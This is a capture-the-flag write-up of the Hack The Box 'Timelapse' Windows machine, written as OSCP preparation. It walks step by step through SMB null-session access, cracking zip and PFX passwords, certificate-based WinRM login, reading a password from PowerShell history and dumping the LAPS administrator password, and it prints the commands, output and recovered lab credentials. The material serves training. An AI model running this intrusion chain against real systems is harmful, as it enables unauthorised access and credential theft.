---
layout: post
title:  HTB Timelapse Write-up (Being edited now)
description: Part of the OSCP+ Preparation Series
date:   2024-11-09 22:30:00 +0300
image:  '/images/htb_timelapse.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Easy, Active-Directory, SMB, SMB-Shares, .PFX, WinRM-.pem, PowerShell-History, LDAP, LDAP-Saved-Password]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [SMB Null Session to find winrm_backup.zip](#smb-null-session-to-find-winrm_backupzip)
  - [Using zip2john to crack and open winrm_backup.zip](#using-zip2john-to-crack-and-open-winrm_backupzip)
  - [Extracting credentials from PFX file with pfx2john](#extracting-credentials-from-pfx-file-with-pfx2john)
- [Foothold](#foothold)
  - [Access using evil-winrm with key.pem and cert.pem](#access-using-evil-winrm-with-keypem-and-certpem)
- [Privilege Escalation](#privilege-escalation)
  - [Finding svc_deploy credentials on powershell history](#finding-svc_deploy-credentials-on-powershell-history)
  - [svc_deploy is part of LDAP_Readers users](#svc_deploy-is-part-of-ldap_readers-users)
  - [Finding Administrator password with native PowerShell AD Module thanks LDAP saved password](#finding-administrator-password-with-native-powershell-ad-module-thanks-ldap-saved-password)

# Enumeration
### Nmap

```shell
# Step 1 - Find active ports (This time its important to use -Pn and sudo, otherwise the scan wont succeed)
sudo nmap -p- -Pn --min-rate 10000 10.129.141.135

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
sudo nmap -A -T4 -Pn -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389 10.129.141.135
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 15:15 EST
Nmap scan report for 10.129.141.135
Host is up (0.034s latency).

PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-11-10 04:15:58Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2024-11-10T04:17:23+00:00; +8h00m00s from scanner time.
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf            .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m59s
| smb2-time: 
|   date: 2024-11-10T04:16:45
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   34.02 ms 10.10.14.1
2   34.08 ms 10.129.141.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.64 seconds
```

### SMB Null Session to find winrm_backup.zip
The first thing we always do when finding SMB is trying a SMB Null Session without credentials:

```shell
smbclient -L 10.129.141.135 -N
```

It worked! We were able to enumerate the available shares:

```shell
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
```

One share called Shares took our attention. Let's enumerate it:

```shell
smbclient //10.129.141.135/Shares -N
```

Enumerating the shares, we found a file called winrm_backup.zip:

```shell
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                6367231 blocks of size 4096. 1223388 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                6367231 blocks of size 4096. 1218002 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (18.1 KiloBytes/sec) (average 18.1 KiloBytes/sec)
```

### Using zip2john to crack and open winrm_backup.zip
The .zip file is protected with a password, but we can use zip2john to crack and open it:

```shell
# Using zip2john
zip2john winrm_backup.zip > zip2john.txt

# And now use john to crack it
john zip2john.txt -wordlist:/usr/share/wordlists/rockyou.txt

# We were successful! It got cracked and we got the following results
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)

# Now unzip it
unzip winrm_backup.zip
# Enter password: supremelegacy

# After unzipping it, we got the following file
legacyy_dev_auth.pfx
```

### Extracting credentials from PFX file with pfx2john
What is the file legacyy_dev_auth.pfx we got? The PFX contains an SSL certificate in PKCS#12 format and a private key. These files can be used by WinRM to log in without a password, similar to id_rsa on SSH.

We can run the following command to try to extract it:

```shell
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

If we enter the password supremelegacy, we will get an error:

```shell
Enter Import Password:
Mac verify error: invalid password?
```

It seems we need another password.

We will use pfx2john to try to crack and open the .pfx file:

```shell
# Use pfx2john
pfx2john legacyy_dev_auth.pfx > pfx2john.txt

# Use john
john pfx2john.txt -wordlist:/usr/share/wordlists/rockyou.txt

# We were able to successfully crack it and get the following credentials
thuglegacy       (legacyy_dev_auth.pfx)
```

Now we can use the cracked password to extract content from the .pfx file:

```shell
# Extract key.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
# Enter Import Password: thuglegacy

# Extract cert.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
# Enter Import Password: thuglegacy
```

# Foothold
### Access using evil-winrm with key.pem and cert.pem
Now that we got key.pem and cert.pem, we can access using evil-winrm with the following command:

```shell
evil-winrm -i 10.129.141.135 -c cert.pem -k key.pem -S
```

### User Flag
Now we can get the user.txt flag:

```shell
type C:\Users\legacyy\Desktop\user.txt
```

# Privilege Escalation
### Finding svc_deploy credentials on powershell history
Once we are in, we did some basic enumeration and were able to find credentials on PowerShell history:

```shell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```shell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We can now use these credentials to get access as svc_deploy using evil-winrm using the -S parameter for SSL:

```shell
evil-winrm -i 10.129.141.135 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

### svc_deploy is part of LDAP_Readers users
If we use the command net user with svc_deploy, we will find out that its a part of LDAP_Readers users:

```shell
net user svc_deploy
```

```shell
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

The LAPS (Local Administrator Password Solution) is used to manage local account passwords of Active Directory computers.
### Finding Administrator password with native PowerShell AD Module thanks LDAP saved password
We can enter the following command to test it the AD module is installed on the target machine, with that module we will be able to enumerate better:

```shell
Get-ADUser -Filter * -Properties * | Select Name, MemberOf
```

It worked! We got some results with some users, meaning the AD module is installed:

```shell
Name          MemberOf
----          --------
Administrator {CN=Group Policy Creator Owners,CN=Users,DC=timelapse,DC=htb, CN=Domain Admins,CN=Users,DC=timelapse,DC=htb, CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb, CN=Schema Admins,CN=Users,DC=timelapse,DC=htb...}
Guest         {CN=Guests,CN=Builtin,DC=timelapse,DC=htb}
krbtgt        {CN=Denied RODC Password Replication Group,CN=Users,DC=timelapse,DC=htb}
TheCyberGeek  {CN=Domain Admins,CN=Users,DC=timelapse,DC=htb}
Payl0ad       {CN=Domain Admins,CN=Users,DC=timelapse,DC=htb}
Legacyy       {CN=Development,OU=Groups,OU=Staff,DC=timelapse,DC=htb, CN=Remote Management Users,CN=Builtin,DC=timelapse,DC=htb}
Sinfulz       {CN=HelpDesk,OU=Groups,OU=Staff,DC=timelapse,DC=htb}
Babywyrm      {CN=HelpDesk,OU=Groups,OU=Staff,DC=timelapse,DC=htb}
svc_deploy    {CN=LAPS_Readers,OU=Groups,OU=Staff,DC=timelapse,DC=htb, CN=Remote Management Users,CN=Builtin,DC=timelapse,DC=htb}
TRX           {CN=Domain Admins,CN=Users,DC=timelapse,DC=htb}
```

Now we can also use the AD module to enumerate the computers:

```shell
Get-ADComputer -Filter * | Select Name, Enabled, SamAccountName
```

```shell
Name  Enabled SamAccountName
----  ------- --------------
DC01     True DC01$
DB01     True DB01$
WEB01    True WEB01$
DEV01    True DEV01$
```

With the AD module, we can use the following command to get the password of Local Administrators on the devices where LAPS is configured:

```shell
Get-ADComputer -Filter * -Properties * | Select Name, ms-Mcs-AdmPwd
```

Nice! Now we got the Administrator password:

```shell
Name  ms-Mcs-AdmPwd
----  -------------
DC01  uvl4s-F$stf,NBy!fP{3wat0
DB01
WEB01
DEV01
```

We can use evil-winrm to get access as Administrator:

```shell
evil-winrm -i 10.129.141.135 -u Administrator -p 'uvl4s-F$stf,NBy!fP{3wat0' -S
```

### Root Flag
Now we can get the root.txt flag (Note that the root.txt is inside TRX desktop this time):

```shell
type C:\Users\TRX\Desktop\root.txt
```